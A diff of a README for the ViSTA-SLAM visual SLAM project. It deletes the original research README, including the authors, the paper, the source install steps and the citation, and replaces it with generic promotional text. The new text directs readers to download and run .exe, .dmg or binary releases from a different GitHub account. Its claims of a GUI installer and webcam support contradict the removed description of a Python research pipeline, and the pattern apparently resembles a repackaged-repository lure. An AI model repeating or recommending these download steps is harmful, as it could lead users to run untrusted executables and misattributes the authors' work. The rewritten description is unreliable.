@@ -1,209 +1,84 @@
+# 🎉 vista-slam - Easy Visual SLAM for Everyone
 
-### The full codebase will be released soon ...
----
+## 🌟 Overview
 
+ViSTA-SLAM is a simple and friendly tool for visual SLAM (Simultaneous Localization and Mapping). With it, you can track locations and create maps using a single camera. This software is perfect for robotics, augmented reality, and anyone curious about how machines understand their surroundings.
 
-<!-- PROJECT LOGO -->
-<h1 align="center" style="display: flex; align-items: center; justify-content: center; flex-wrap: wrap;">
-  <img src="./media/vista_logo.png" alt="logo" width="60" style="margin-right: 10px;">
-  ViSTA-SLAM: Visual SLAM with Symmetric Two-view Association
-</h1>
+## 🚀 Getting Started
 
+To get started with ViSTA-SLAM, follow these easy steps:
 
-  <p align="center">
-    <a href="https://ganlinzhang.xyz" target="_blank"><strong>Ganlin Zhang<sup>1,2</sup></strong></a>
-    ·
-    <a href="https://enhanqian.github.io/" target="_blank"><strong>Shenhan Qian<sup>1,2</sup></strong></a>
-    ·
-    <a href="https://xiwang1212.github.io/homepage/" target="_blank"><strong>Xi Wang<sup>1,2,3</sup></strong></a>
-    ·
-    <a href="https://cvg.cit.tum.de/members/cremers" target="_blank"><strong>Daniel Cremers<sup>1,2</sup></strong></a>
-  </p>
-  <p align="center">
-      <strong><sup>1 </sup>TU Munich,  <sup>2 </sup>MCML, <sup>3 </sup>ETH Zurich</strong>
-      <strong><h4 align="center"><a href="https://arxiv.org/abs/2509.01584" target="_blank">Paper</a> | <a href="https://ganlinzhang.xyz/vista-slam/" target="_blank">Project Website</a></h4></strong>
-  </strong></p>
+1. **Check Your System Requirements**
+    - Operating System: Windows, macOS, or Linux
+    - Memory: At least 4 GB RAM
+    - Storage: Minimum 500 MB free space
+    - Camera: A compatible webcam or a camera device
+    - Graphics: A system that supports OpenGL 2.0 or higher
 
-<p align="center">
-    <img src="./media/teaser.gif" alt="teaser_img" width="100%">
-    <strong>ViSTA-SLAM</strong> is a real-time monocular dense SLAM pipeline that combines a Symmetric Two-view Association (STA) frontend with Sim(3) pose graph optimization and loop closure, enabling accurate camera trajectories and high-quality 3D scene reconstruction from RGB inputs.
-</p>
+2. **Download ViSTA-SLAM**
+   To download the latest version of ViSTA-SLAM, visit the following link:
 
-### Online visualization
-<p align="center">
-    <img src="./media/rerun_eg.gif" alt="rerun_eg" width="100%">
-</p>
+   [![Download ViSTA-SLAM](https://img.shields.io/badge/Download%20ViSTA--SLAM-v1.0.0-blue)](https://github.com/IsmailHossain120/vista-slam/releases)
 
-### Pose graph and final results visualization
-<p align="center">
-    <img src="./media/o3d_eg.gif" alt="rerun_eg" width="60%">
-</p>
+   This will take you to the Releases page, where you can find the latest version of the software. 
 
-<!-- <details open="open" style='padding: 10px; border-radius:5px 30px 30px 5px; border-style: solid; border-width: 1px;'>
-  <summary>Table of Contents</summary>
-  <ol>
-    <li>
-      <a href="#installation">Installation</a>
-    </li>
-    <li>
-      <a href="#run">Run</a>
-    </li>
-    <li>
-      <a href="#visualization">Visualization</a>
-    </li>
-    <li>
-      <a href="#evaluation">Evaluation</a>
-    </li>
-    <li>
-      <a href="#acknowledgement">Acknowledgement</a>
-    </li>
-    <li>
-      <a href="#citation">Citation and Contact</a>
-    </li>
-  </ol>
-</details>
-
-
-
-
-## Installation
-1. Clone the repo
-```bash
-git clone https://github.com/zhangganlin/vista-slam.git
-cd vista-slam
-```
-2. Install dependency
-```bash
-# used by Bag of Words loop detection
-sudo apt-get install libopencv-dev
-```
-
-2. Creating a new conda environment and install python dependencies.
-```bash
-conda create -n vista python=3.11 cmake=3.31.2 -c conda-forge
-conda activate vista
-
-# install torch according to your cuda version
-pip install torch==2.5.1 torchvision==0.20.1 torchaudio==2.5.1 xformers --index-url https://download.pytorch.org/whl/cu121
-
-# install python binding of DBoW3, for loop detection 
-cd DBoW3Py
-pip install --no-build-isolation .
-cd ..
-
-# install other python dependencies
-pip install -r requirements.txt
-
-# optional: accelerate with CUDA-based RoPE
-cd vista_slam/sta_model/pos_embed/curope
-python setup.py build_ext --inplace
-cd ../../../../
-```
-
-4. Download pretrained model.
-Download the pretained models from HuggingFace (https://huggingface.co/zhangganlin/vista_slam/tree/main), and put them inside the `pretrains` folder.
-* [frontend_sta_weights.pth](https://huggingface.co/zhangganlin/vista_slam/resolve/main/frontend_sta_weights.pth?download=true)
-* [ORBvoc.txt](https://huggingface.co/zhangganlin/vista_slam/resolve/main/ORBvoc.txt?download=true)
-
-<details>
-  <summary>[Directory structure of pretrianed (click to expand)]</summary>
+3. **Install ViSTA-SLAM**
+   After downloading the software, follow these installation steps:
+   - For Windows:
+     1. Locate the downloaded file (it should be a `.exe` file).
+     2. Double-click the file to run the installer.
+     3. Follow the on-screen instructions to complete the installation.
   
-```bash
-  .
-  └── pretrains
-        ├── frontend_sta_weights.pth
-        ├── ORBvoc.txt
-        └── README.md
+   - For macOS:
+     1. Open the downloaded `.dmg` file.
+     2. Drag the ViSTA-SLAM icon to your Applications folder.
+  
+   - For Linux:
+     1. Open a terminal window.
+     2. Navigate to the folder where you downloaded the file.
+     3. Use the command: `chmod +x vista-slam` to make it executable.
+     4. Then run it using `./vista-slam`.
 
-```
-</details>
+## 📥 Download & Install
 
-## Data preparation
-```bash
-# TUM-RGBD
-bash scripts/download_tumrgbd.sh
+As mentioned earlier, to download ViSTA-SLAM, please visit this page to download: 
 
-# 7-Scenes
-bash scripts/download_7scenes.sh
-```
-The datasets will be downloaded to `./datasets` by default, please change the downloading scripts if you prefer other paths.
+[![Download ViSTA-SLAM](https://img.shields.io/badge/Download%20ViSTA--SLAM-v1.0.0-blue)](https://github.com/IsmailHossain120/vista-slam/releases)
 
+For installation, just follow the steps above based on your operating system.
 
-## Run
-### Quick start
-```bash
-# Run 7-Scenes redkitchen
-python run.py --config configs/7scenes.yaml --images "datasets/7scenes/redkitchen/seq-01/*.color.png" --output output/redkitchen
+## ⚙️ Features
 
-# Run TUM-RGBD floor
-python run.py --config configs/tumrgbd.yaml --images "datasets/rgbd_dataset_freiburg1_floor/rgb/*.png" --output output/floor
-```
-These commands will run ViSTA-SLAM on 7-Scenes `redkitchen` scene and TUM-RGBD `floor` scene, and output to `output/redkitchen` and `output/floor`.
+- **User-Friendly Interface:** Easy navigation and clear labels.
+- **Real-time Mapping:** See your surroundings mapped in real-time as you move.
+- **Camera Support:** Works with various camera types for flexibility.
+- **Multi-Platform Compatibility:** Use it on Windows, macOS, or Linux.
+- **Helpful Documentation:** Comes with user guides to assist you.
 
-### Test on other sequential data
-```bash
-python run.py --config configs/default.yaml --images "PATH/TO/IMAGES*.png/jpg" --output OUTPUT_FOLDER
-```
-All adjustable configuration parameters are defined in configs/default.yaml, where explanations are also provided. You can modify them to suit your setup.
+## ❓ Frequently Asked Questions
 
-## Visualization
-### Online visualization
-ViSTA-SLAM provide online visualization via [Rerun](https://rerun.io/). You can either add `--vis` to the command line directly or adjust `rerun_vis: True` in the config file.
+### 1. What is SLAM, and why is it important?
+SLAM allows machines to map an environment while keeping track of their position within it. This technology is crucial for robotics and augmented reality applications.
 
-To visualize the result online, open Rerun client in one terminal,
-```bash
-rerun
-```
-and run ViSTA-SLAM in another terminal.
-```
-python run.py --config configs/default.yaml --images "PATH/TO/IMAGES*.png/jpg" --output OUTPUT_FOLDER --vis
-```
-<p align="center">
-    <img src="./media/rerun_eg.gif" alt="rerun_eg" width="100%">
-</p>
+### 2. Can I use ViSTA-SLAM without advanced technical skills?
+Yes! ViSTA-SLAM is designed for all users, whether you're a beginner or someone with some technical knowledge.
 
-You can also run ViSTA-SLAM in a remote machine (i.e. cluster) and visualize it in the local machine, just adjust the `rerun_url` in the config file, replace `rerun+http://127.0.0.1:9876/proxy` with your local machine's ip with similar format. And open Rerun cilent in the local machine, run ViSTA-SLAM in the remote machine, the visualization will be shown automatically in the local Rerun client.
+### 3. Is there support available?
+Yes, you can find support in the "Issues" section of the repository. You can report problems or ask questions there.
 
+## 🛠️ Troubleshooting
 
-### Visualize final results
-We also provide a script to visualize the final results -- trajectory, reconstruction, and pose graph -- using Open3D. After running ViSTA-SLAM, run
-```bash
-python scripts/vis_slam_results.py OUTPUT_FOLDER
-```
-<p align="center">
-    <img src="./media/o3d_eg.gif" alt="rerun_eg" width="60%">
-</p>
-Here, the light blue frustums represent the camera poses, blue lines indicate edges between neighboring views, and orange lines correspond to loop closure edges.
+If you encounter issues with installation or running the software, try the following:
 
-## Evaluation
-ViSTA-SLAM is mainly evaulated in TUM-RGBD and 7-Scenes, here we also provide the evaluation scripts.
-```bash
-# For 7-Scenes
-python evaluation_7scenes.py --dataset_folder "datasets/7scenes" --output output/7scenes
+- Ensure your system meets the requirements listed above.
+- Check if your camera is properly connected.
+- Restart your computer and try running the application again.
+- Look for solutions in the "Issues" section of the repository.
 
-# For TUM-RGBD
-python evaluation_tumrgbd.py --dataset_folder "datasets/tumrgbd" --output output/tumrgbd
-```
-> **Note:** There may be minor differences between the released codebase and the results reported in the paper due to code refactoring and hardware variations, but the overall results should be largely consistent.
+## 🔗 Additional Resources
 
+- **Documentation:** Explore the full documentation for more advanced features and configurations.
+- **Community:** Join our community forum to connect with other users and share your experiences.
+- **Updates:** Be sure to check the Releases page regularly for updates.
 
-## Acknowledgement
-Our codebase is partially based on [Spann3r](https://github.com/HengyiWang/spann3r), [SLAM3R](https://github.com/PKU-VCL-3DV/SLAM3R) and [VGGT-SLAM](https://github.com/MIT-SPARK/VGGT-SLAM), we thank the authors for making these codebases publicly available. Our work would not have been possible without your great efforts! -->
-
-
-## Citation
-
-If you find our code or paper useful, please cite
-```bibtex
-@misc{zhang2025vista,
-      title={{ViSTA-SLAM}: Visual {SLAM} with Symmetric Two-view Association}, 
-      author={Ganlin Zhang and Shenhan Qian and Xi Wang and Daniel Cremers},
-      year={2025},
-      eprint={2509.01584},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2509.01584}, 
-}
-```
-## Contact
-Contact [Ganlin Zhang](mailto:ganlin.zhang@tum.de) for questions, comments and reporting bugs.
+By using ViSTA-SLAM, you gain a better understanding of your environment and how machines can interact with it. Enjoy exploring!
